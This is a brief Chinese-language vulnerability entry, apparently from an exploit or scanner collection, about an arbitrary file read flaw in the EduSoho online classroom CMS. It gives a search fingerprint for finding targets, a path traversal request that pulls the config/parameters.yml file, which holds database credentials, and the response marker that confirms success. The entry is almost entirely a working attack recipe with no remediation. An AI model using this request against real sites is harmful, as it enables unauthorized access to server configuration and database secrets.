# Edusoho网络课堂cms存在任意文件读取漏洞

Edusoho ｜ 任意文件读取/写入 ｜ —
- **指纹**：`title="EduSoho"`
- **请求**：`GET /export/classroom-course-statistics?fileNames[]=../../../config/parameters.yml HTTP/1.1`
- **响应特征**：200 database_name